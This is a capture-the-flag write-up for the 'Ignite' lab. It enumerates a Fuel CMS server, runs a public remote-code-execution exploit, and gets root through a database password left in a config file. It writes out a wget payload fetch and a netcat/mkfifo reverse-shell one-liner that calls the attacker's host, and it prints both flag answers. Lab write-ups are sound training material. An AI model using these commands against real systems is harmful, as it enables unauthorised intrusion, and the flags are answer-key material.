# Ignite

export IP=10.10.119.165

## 1 User.txt

lets start with an nmap scan

cmd: nmap -sC -sV -oN nmap/initial $IP

```
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS

```

we can see a robots with disallowed entry for<b> /fuel/ </b> <br>

lets check the web server while running a gobuster <br>
There is default creds

```
admin:admin
```
But couldn create a page and access it (maybe my fault) <br>



by visiting the website it clear that the fuel CMS is in use, lets check the robots manually. (nothing more there) <br>

cmd: gobuster dir -u http://$IP -o gobuster/initial -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -t 50

```
Nothing interesting
```

Lets do another gobuster on the /fuel/ directory<br>

cmd: gobuster dir -u http://$IP/fuel/ -o gobuster/initial -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -x php,html,txt

```
took too much time, the connection was slow and with more threads it was slow as fuck...
```

Manually found /login page but no SQLi there<br>

Just check searchsploit...<br>

```
searchsploit fuel

Fuel CMS 1.4.7 - 'col' SQL Injection (A | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL  | php/webapps/48778.txt
fuelCMS 1.4.1 - Remote Code Execution   | linux/webapps/47138.py (seems good)
```

get the exploit to the curr folder and modify the url and remove the proxies (in this scenario is not needed)

```
searchsploit -m linux/webapps/47138.py
```

We got cmd execution... (tested with cmd: cat /etc/passwd) <br>

Now lets wget a revshell, why not?!

```
cmd: wget "http://10.9.128.84:8888/rev.php" -P /tmp/waza_rev.php
```
Well, it gets the file but when running it does not work... bash reverse shell and inline python's also did not work...<br>
It may be because netcat is the restricted version....<br>

Lets try the OpenBSD one

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.128.84 1415 >/tmp/f
```
And yeah, the theory was correct... i'm in.

```
whoami 
www-data
```

At this user home folder there was a flag.txt file (i suppose that it is the user.txt)

```
cat /home/www.data/flag.txt
FLAG: 6470e394cbf6dab6a91682cc8585059b
```

### Answer: 6470e394cbf6dab6a91682cc8585059b

## 1 Root.txt

for sudo -l (to fast check privesc) it is needed the www-data password, which i dont have.<br>
Also no crontab (for www-data and in the /etc/crontab )<br>

lets check the fuel home page... section: install the database. <br>

path: /var/www/html/fuel/application/config/database.php
```

'username' => 'root',
'password' => 'mememe',

su root
Password: mememe


whoami
root

cat /root/root.txt
FLAG: b9bbcb33e11b80be759c4e844862482d
```

### Answer: b9bbcb33e11b80be759c4e844862482d



